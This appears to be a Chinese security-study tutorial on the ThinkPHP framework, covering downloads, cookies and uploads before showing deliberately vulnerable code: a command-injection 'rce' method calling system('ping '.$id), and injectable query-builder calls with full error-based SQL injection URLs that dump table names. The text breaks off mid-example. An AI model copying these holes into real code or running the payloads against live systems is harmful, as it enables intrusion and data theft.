<p>&#x652F;&#x6301;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x529F;&#x80FD;&#xFF0C;&#x53EF;&#x4EE5;&#x66F4;&#x7B80;&#x5355;&#x7684;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x4E0B;&#x8F7D;&#x64CD;&#x4F5C;&#xFF0C;&#x652F;&#x6301;&#x76F4;&#x63A5;&#x4E0B;&#x8F7D;&#x8F93;&#x51FA;&#x5185;&#x5BB9;&#x3002;</p>
<p>&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x63A7;&#x5236;&#x5668;&#x7684;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x4E2D;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p>
<pre><code>public function download()
    {
        // download&#x662F;&#x7CFB;&#x7EDF;&#x5C01;&#x88C5;&#x7684;&#x4E00;&#x4E2A;&#x52A9;&#x624B;&#x51FD;&#x6570;
        return download(&apos;image.jpg&apos;, &apos;my.jpg&apos;);
    }
</code></pre><p>&#x8BBF;&#x95EE;<code>download</code>&#x64CD;&#x4F5C;&#x5C31;&#x4F1A;&#x4E0B;&#x8F7D;&#x547D;&#x540D;&#x4E3A;<code>my.jpg</code>&#x7684;&#x56FE;&#x50CF;&#x6587;&#x4EF6;&#x3002;</p>
<blockquote>
<p>&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x7684;&#x8DEF;&#x5F84;&#x662F;&#x670D;&#x52A1;&#x5668;&#x8DEF;&#x5F84;&#x800C;&#x4E0D;&#x662F;URL&#x8DEF;&#x5F84;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x4E0B;&#x8F7D;&#x7684;&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;</p>
</blockquote>
<p>&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#x540E;&#x7F00;&#xFF0C;&#x4F1A;&#x81EA;&#x52A8;&#x5224;&#x65AD;&#xFF08;&#x540E;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x90FD;&#x4EE5;&#x52A9;&#x624B;&#x51FD;&#x6570;&#x4E3A;&#x4F8B;&#xFF09;</p>
<pre><code>public function download()
    {
        // &#x548C;&#x4E0A;&#x9762;&#x7684;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x540D;&#x662F;&#x4E00;&#x6837;&#x7684;&#x6548;&#x679C;
        return download(&apos;image.jpg&apos;, &apos;my&apos;);
    }
</code></pre><p>&#x5982;&#x679C;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x7684;&#x6709;&#x6548;&#x671F;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>public function download()
    {
        // &#x8BBE;&#x7F6E;300&#x79D2;&#x6709;&#x6548;&#x671F;
        return download(&apos;image.jpg&apos;, &apos;my&apos;)-&gt;expire(300);
    }
</code></pre><p>&#x9664;&#x4E86;<code>expire</code>&#x65B9;&#x6CD5;&#x5916;&#xFF0C;&#x8FD8;&#x652F;&#x6301;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:left">&#x65B9;&#x6CD5;</th>
<th style="text-align:left">&#x63CF;&#x8FF0;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">name</td>
<td style="text-align:left">&#x547D;&#x540D;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;</td>
</tr>
<tr>
<td style="text-align:left">expire</td>
<td style="text-align:left">&#x4E0B;&#x8F7D;&#x6709;&#x6548;&#x671F;</td>
</tr>
<tr>
<td style="text-align:left">isContent</td>
<td style="text-align:left">&#x662F;&#x5426;&#x4E3A;&#x5185;&#x5BB9;&#x4E0B;&#x8F7D;</td>
</tr>
<tr>
<td style="text-align:left">mimeType</td>
<td style="text-align:left">&#x8BBE;&#x7F6E;&#x6587;&#x4EF6;&#x7684;mimeType&#x7C7B;&#x578B;</td>
</tr>
<tr>
<td style="text-align:left">force</td>
<td style="text-align:left">&#x662F;&#x5426;&#x5F3A;&#x5236;&#x4E0B;&#x8F7D;&#xFF08;<code>V6.0.3+</code>&#xFF09;</td>
</tr>
</tbody>
</table>
<p>&#x52A9;&#x624B;&#x51FD;&#x6570;&#x63D0;&#x4F9B;&#x4E86;&#x5185;&#x5BB9;&#x4E0B;&#x8F7D;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x76F4;&#x63A5;&#x4E0B;&#x8F7D;&#x5185;&#x5BB9;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x4F20;&#x5165;<code>true</code>&#xFF1A;</p>
<pre><code>public function download()
{
    $data = &apos;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&apos;;
    return download($data, &apos;test.txt&apos;, true);
}
</code></pre><p><code>V6.0.3+</code>&#x7248;&#x672C;&#x5F00;&#x59CB;&#xFF0C;&#x652F;&#x6301;&#x8BBE;&#x7F6E;&#x662F;&#x5426;&#x5F3A;&#x5236;&#x4E0B;&#x8F7D;&#xFF0C;&#x4F8B;&#x5982;&#x9700;&#x8981;&#x6253;&#x5F00;&#x56FE;&#x50CF;&#x6587;&#x4EF6;&#x800C;&#x4E0D;&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x4E0B;&#x8F7D;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF1A;</p>
<pre><code>public function download()
{
    return download(&apos;image.jpg&apos;, &apos;my.jpg&apos;)-&gt;force(false);
}
</code></pre><h2 id="cookie">Cookie</h2>
<p>ThinkPHP&#x91C7;&#x7528;<code>think\facade\Cookie</code>&#x7C7B;&#x63D0;&#x4F9B;Cookie&#x652F;&#x6301;&#x3002;</p>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cookie</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-comment">// &#x5B58;&#x50A8;3600s</span>
        Cookie::set(<span class="hljs-string">&apos;user&apos;</span>,<span class="hljs-string">&apos;userli&apos;</span>,<span class="hljs-number">3600</span>);
        <span class="hljs-comment">// &#x53D6;&#x5F97;cookie</span>
<span class="hljs-comment">//        dump(Cookie::get(&apos;user&apos;));</span>
        <span class="hljs-comment">// &#x6C38;&#x4E45;&#x4FDD;&#x5B58;cookie</span>
        Cookie::forever(<span class="hljs-string">&apos;haha&apos;</span>,<span class="hljs-string">&apos;nihaoa&apos;</span>);
        <span class="hljs-comment">// &#x5220;&#x9664;cookie</span>
        Cookie::delete(<span class="hljs-string">&apos;user&apos;</span>);

    }
</code></pre>
<h4 id="&#x914D;&#x7F6E;">&#x914D;&#x7F6E;</h4>
<p>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4F4D;&#x4E8E;&#x914D;&#x7F6E;&#x76EE;&#x5F55;&#x4E0B;&#x7684;<code>cookie.php</code>&#x6587;&#x4EF6;&#xFF0C;&#x65E0;&#x9700;&#x624B;&#x52A8;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x5728;&#x8C03;&#x7528;&#x4E4B;&#x524D;&#x81EA;&#x52A8;&#x8FDB;&#x884C;<code>Cookie</code>&#x521D;&#x59CB;&#x5316;&#x5DE5;&#x4F5C;&#x3002;</p>
<p>&#x652F;&#x6301;&#x7684;&#x53C2;&#x6570;&#x53CA;&#x9ED8;&#x8BA4;&#x503C;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>// cookie &#x4FDD;&#x5B58;&#x65F6;&#x95F4;
&apos;expire&apos;    =&gt; 0,
// cookie &#x4FDD;&#x5B58;&#x8DEF;&#x5F84;
&apos;path&apos;      =&gt; &apos;/&apos;,
// cookie &#x6709;&#x6548;&#x57DF;&#x540D;
&apos;domain&apos;    =&gt; &apos;&apos;,
//  cookie &#x542F;&#x7528;&#x5B89;&#x5168;&#x4F20;&#x8F93;
&apos;secure&apos;    =&gt; false,
// httponly&#x8BBE;&#x7F6E;
&apos;httponly&apos;  =&gt; &apos;&apos;,
// samesite &#x8BBE;&#x7F6E;&#xFF0C;&#x652F;&#x6301; &apos;strict&apos; &apos;lax&apos;
 &apos;samesite&apos; =&gt; &apos;&apos;,
</code></pre><h5 id="&#x57FA;&#x672C;&#x64CD;&#x4F5C;">&#x57FA;&#x672C;&#x64CD;&#x4F5C;</h5>
<h5 id="&#x8BBE;&#x7F6E;">&#x8BBE;&#x7F6E;</h5>
<pre><code>// &#x8BBE;&#x7F6E;Cookie &#x6709;&#x6548;&#x671F;&#x4E3A; 3600&#x79D2;
Cookie::set(&apos;name&apos;, &apos;value&apos;, 3600);
</code></pre><p><code>Cookie</code>&#x6570;&#x636E;&#x4E0D;&#x652F;&#x6301;&#x6570;&#x7EC4;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x8BF7;&#x81EA;&#x884C;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x5B58;&#x5165;&#x3002;</p>
<h5 id="&#x6C38;&#x4E45;&#x4FDD;&#x5B58;">&#x6C38;&#x4E45;&#x4FDD;&#x5B58;</h5>
<pre><code>// &#x6C38;&#x4E45;&#x4FDD;&#x5B58;CookieCookie::forever(&apos;name&apos;, &apos;value&apos;);
</code></pre><h5 id="&#x5220;&#x9664;">&#x5220;&#x9664;</h5>
<pre><code>//&#x5220;&#x9664;cookieCookie::delete(&apos;name&apos;);
</code></pre><h5 id="&#x8BFB;&#x53D6;">&#x8BFB;&#x53D6;</h5>
<pre><code>// &#x8BFB;&#x53D6;&#x67D0;&#x4E2A;cookie&#x6570;&#x636E;
Cookie::get(&apos;name&apos;);
// &#x83B7;&#x53D6;&#x5168;&#x90E8;cookie&#x6570;&#x636E;
Cookie::get();
</code></pre><h5 id="&#x52A9;&#x624B;&#x51FD;&#x6570;">&#x52A9;&#x624B;&#x51FD;&#x6570;</h5>
<p>&#x7CFB;&#x7EDF;&#x63D0;&#x4F9B;&#x4E86;<code>cookie</code>&#x52A9;&#x624B;&#x51FD;&#x6570;&#x7528;&#x4E8E;&#x57FA;&#x672C;&#x7684;<code>cookie</code>&#x64CD;&#x4F5C;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>// &#x8BBE;&#x7F6E;
cookie(&apos;name&apos;, &apos;value&apos;, 3600);

// &#x83B7;&#x53D6;
echo cookie(&apos;name&apos;);

// &#x5220;&#x9664;
cookie(&apos;name&apos;, null);
</code></pre><blockquote>
<p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x540C;&#x65F6;&#x8BBE;&#x7F6E;<code>samesite=none</code>,<code>secure=true</code>&#x7684;&#x65B9;&#x5F0F;,&#x5B9E;&#x73B0;&#x8DE8;&#x57DF;&#x4F20;&#x9012;cookie</p>
</blockquote>
<h2 id="&#x6587;&#x4EF6;&#x4E0A;&#x4F20;">&#x6587;&#x4EF6;&#x4E0A;&#x4F20;</h2>
<pre><code class="lang-http">composer require topthink/think-view
</code></pre>
<p>&#x5148;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#xFF0C;&#x83B7;&#x5F97;view&#x89C6;&#x56FE;</p>
<p>&#x5982;&#x679C;&#x7206;filesystem&#x4E0D;&#x5B58;&#x5728;&#x5219;&#x5982;&#x4E0B;&#xFF0C;&#x6216;&#x8005;</p>
<p>&#x5219;&#x5728;composer.json&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x6DFB;&#x52A0;&#x4E00;&#x884C;</p>
<pre><code class="lang-http">&quot;topthink/think-filesystem&quot;:&quot;^1.0&quot;
</code></pre>
<p><img src="https://s3.bmp.ovh/imgs/2023/02/01/db7039a1016a4818.png" alt=""></p>
<p>&#x5982;&#x679C;&#x663E;&#x793A;</p>
<pre><code class="lang-cmd">Class &#x2018;think\\facade\\Filesystem&#x2018; <span class="hljs-keyword">not</span> found &#x7684;&#x9519;&#x8BEF;&#xFF0C;&#x5219;&#x5220;&#x9664;composer.lock&#xFF0C;&#x7136;&#x540E;&#x7EC8;&#x7AEF;&#x6267;&#x884C;

composer install
</code></pre>
<h4 id="&#x4E00;&#x5171;&#x9700;&#x8981;&#x4E09;&#x4E2A;&#x6587;&#x4EF6;">&#x4E00;&#x5171;&#x9700;&#x8981;&#x4E09;&#x4E2A;&#x6587;&#x4EF6;</h4>
<h4 id="viewstoreuploadhtml">\view\store\upload.html</h4>
<p>&#x89C6;&#x56FE;&#x6587;&#x4EF6;</p>
<p>&#x5047;&#x8BBE;&#x8868;&#x5355;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/upload/index&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;image&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x4E0A;&#x4F20;&quot;</span> /&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
</code></pre>
<h4 id="appcontrollerstorephp">\app\controller\Store.php</h4>
<p>&#x8F6C;&#x5230;&#x89C6;&#x56FE;&#x6587;&#x4EF6;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controller</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Cache</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Cookie</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">View</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Filesystem</span>;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Store</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> View::fetch(<span class="hljs-string">&apos;upload&apos;</span>);
    }
}
</code></pre>
<h4 id="appcontrolleruploadphp">\app\controller\Upload.php</h4>
<p>&#x4E0A;&#x4F20;&#x63A5;&#x6536;&#x5904;&#x7406;&#x6587;&#x4EF6;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controller</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Filesystem</span>;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Upload</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>
    </span>{
        $file = Request::file(<span class="hljs-string">&apos;image&apos;</span>);
        $info = Filesystem::putfile(<span class="hljs-string">&apos;topic&apos;</span>,$file);
        <span class="hljs-keyword">return</span> json($info);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rce</span><span class="hljs-params">($id)</span>
    </span>{
        $user = system(<span class="hljs-string">&quot;ping &quot;</span>.$id);
        <span class="hljs-keyword">return</span> json($user);
    }
}
</code></pre>
<h4 id="&#x6279;&#x91CF;&#x4E0A;&#x4F20;">&#x6279;&#x91CF;&#x4E0A;&#x4F20;</h4>
<p>Upload.html</p>
<pre><code class="lang-html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://localhost:8000/upload/more&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;image[]&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;image[]&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;image[]&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x4E0A;&#x4F20;&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>


<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>Upload.php</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controller</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Filesystem</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Upload</span>
</span>{

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">more</span><span class="hljs-params">()</span>
    </span>{
        $files = Request::file(<span class="hljs-string">&apos;image&apos;</span>);
        $info = [];
        <span class="hljs-keyword">foreach</span> ($files <span class="hljs-keyword">as</span> $file){
            $info[] = Filesystem::putfile(<span class="hljs-string">&apos;topic&apos;</span>,$file);
        }
        <span class="hljs-keyword">return</span> json($info);

    }

}
</code></pre>
<h4 id="&#x9650;&#x5236;-&#x767D;&#x540D;&#x5355;">&#x9650;&#x5236;-&#x767D;&#x540D;&#x5355;</h4>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controller</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Filesystem</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Validate</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Upload</span>
</span>{

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>
    </span>{
        $file = Request::file(<span class="hljs-string">&apos;image&apos;</span>);
    <span class="hljs-comment">//&#x7F16;&#x5199;&#x89C4;&#x5219;</span>
        $validate = Validate::rule([
            <span class="hljs-string">&apos;image&apos;</span> =&gt;  <span class="hljs-string">&apos;fileExt:jpg,html,png|fileMime:image/jpeg&apos;</span>

        ]);
        $result = $validate-&gt;check([
            <span class="hljs-string">&apos;image&apos;</span> =&gt;  $file
        ]);

        <span class="hljs-keyword">if</span> ($result) {

            $info = Filesystem::putfile(<span class="hljs-string">&apos;topic&apos;</span>, $file);
            <span class="hljs-keyword">return</span> json($info);
        }<span class="hljs-keyword">else</span>{
            dump($validate-&gt;getError());
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rce</span><span class="hljs-params">($id)</span>
    </span>{
        $user = system(<span class="hljs-string">&quot;ping &quot;</span>.$id);
        <span class="hljs-keyword">return</span> json($user);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">more</span><span class="hljs-params">()</span>
    </span>{
        $files = Request::file(<span class="hljs-string">&apos;image&apos;</span>);
        $info = [];
        <span class="hljs-keyword">foreach</span> ($files <span class="hljs-keyword">as</span> $file){
            $info[] = Filesystem::putfile(<span class="hljs-string">&apos;topic&apos;</span>,$file);
        }
        <span class="hljs-keyword">return</span> json($info);

    }

}
</code></pre>
<h2 id="sql&#x6CE8;&#x5165;&#x7684;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;">SQL&#x6CE8;&#x5165;&#x7684;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;</h2>
<h3 id="&#x94FE;&#x5F0F;&#x64CD;&#x4F5C;">&#x94FE;&#x5F0F;&#x64CD;&#x4F5C;</h3>
<h4 id="&#x5B58;&#x5728;&#x6CE8;&#x5165;">&#x5B58;&#x5728;&#x6CE8;&#x5165;</h4>
<h5 id="where">where</h5>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqli</span><span class="hljs-params">($id)</span>
    </span>{
        $user = Db::table(<span class="hljs-string">&apos;ty_user&apos;</span>)-&gt;where(<span class="hljs-string">&apos;id=&apos;</span>.$id)-&gt;find();
        <span class="hljs-keyword">return</span> Db::getLastsql();

    }
</code></pre>
<p><a href="https://imgse.com/i/ppChTEj" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppChTEj.png" alt="ppChTEj.png"></a></p>
<p>whereraw</p>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqli</span><span class="hljs-params">($id)</span>
    </span>{
        $user = Db::table(<span class="hljs-string">&apos;ty_user&apos;</span>)-&gt;whereRaw(<span class="hljs-string">&apos;id=&apos;</span>.$id)-&gt;find();
        <span class="hljs-keyword">return</span> Db::getLastsql();

    }
</code></pre>
<p><a href="https://imgse.com/i/ppChL80" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppChL80.png" alt="ppChL80.png"></a></p>
<h5 id="alias">alias</h5>
<p>&#x5176;&#x5B9E;&#x662F;&#x6709;&#x6CE8;&#x5165;&#x7684;</p>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqli</span><span class="hljs-params">($a)</span>
    </span>{
        $user = Db::table(<span class="hljs-string">&apos;ty_user&apos;</span>)-&gt;alias($a)-&gt;where(<span class="hljs-string">&apos;id=1&apos;</span>)-&gt;find();
        <span class="hljs-keyword">return</span> Db::getLastsql();

    }
</code></pre>
<pre><code>http://localhost:8000/datatest/sqli?a=d WHERE 5718=5718 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170786a71,(SELECT MID((IFNULL(CAST(table_name AS NCHAR),0x20)),1,451) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x73747564656e7431)),0x7176767171,0x78))s), 8446744073709551610, 8446744073709551610)))-- pVFx
</code></pre><p><a href="https://imgse.com/i/ppC5YSx" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppC5YSx.png" alt="ppC5YSx.png"></a><a href="https://imgse.com/i/ppC5N6K" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppC5N6K.png" alt="ppC5N6K.png"></a></p>
<p>&#x3002;</p>
<h5 id="field">field</h5>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqli</span><span class="hljs-params">($id)</span>
    </span>{
        $user = Db::table(<span class="hljs-string">&apos;ty_user&apos;</span>)-&gt;field($id.<span class="hljs-string">&apos;,username,password&apos;</span>)-&gt;select();

        <span class="hljs-keyword">return</span> Db::getLastsql();

    }
</code></pre>
<p><a href="https://imgse.com/i/ppCIQjf" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppCIQjf.png" alt="ppCIQjf.png"></a></p>
<p>fieldraw&#x540C;&#x7406;</p>
<h5 id="table">table</h5>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqli2</span><span class="hljs-params">($tablename, $id)</span>
    </span>{
        $user = Db::table($tablename)-&gt;where(<span class="hljs-string">&apos;id=&apos;</span>.$id)-&gt;find();
        <span class="hljs-keyword">return</span> Db::getLastsql();

    }
</code></pre>
<pre><code>http://localhost:8000/datatest/sqli2?tablename=ty_user WHERE 1106=1106 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171627071,(SELECT MID((IFNULL(CAST(table_name AS NCHAR),0x20)),1,451) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x73747564656e7431)),0x7178706b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- lPVh
</code></pre><p><a href="https://imgse.com/i/ppCIc59" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppCIc59.png" alt="ppCIc59.png"></a></p>
<h5 id="group-by">group by</h5>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqli</span><span class="hljs-params">($id)</span>
    </span>{
        $user = Db::table(<span class="hljs-string">&apos;ty_user&apos;</span>)-&gt;field(<span class="hljs-string">&apos;id,username,password&apos;</span>)-&gt;group($id)-&gt;select();
        <span class="hljs-keyword">return</span> Db::getLastsql();

    }
</code></pre>
<p><a href="https://imgse.com/i/ppCoDzt" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppCoDzt.png" alt="ppCoDzt.png"></a></p>
<h5 id="having">having</h5>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqli</span><span class="hljs-params">($id)</span>
    </span>{
        $user = Db::table(<span class="hljs-string">&apos;ty_user&apos;</span>)-&gt;field(<span class="hljs-string">&apos;id,username,password&apos;</span>)-&gt;group(<span class="hljs-string">&apos;id&apos;</span>)-&gt;having($id)-&gt;select();
        <span class="hljs-keyword">return</span> Db::getLastsql();
</code></pre>
<p><a href="https://imgse.com/i/ppCofij" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppCofij.png" alt="ppCofij.png"></a></p>
<h5 id="join">join</h5>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqli</span><span class="hljs-params">($id)</span>
    </span>{
        $subsql = Db::table(<span class="hljs-string">&apos;ty_user&apos;</span>)
            -&gt;group(<span class="hljs-string">&apos;id&apos;</span>)
            -&gt;buildSql();

        $user = Db::table(<span class="hljs-string">&apos;ty_user&apos;</span>)-&gt;alias(<span class="hljs-string">&apos;a&apos;</span>)-&gt;join([$subsql=&gt; <span class="hljs-string">&apos;w&apos;</span>], $id)-&gt;select();
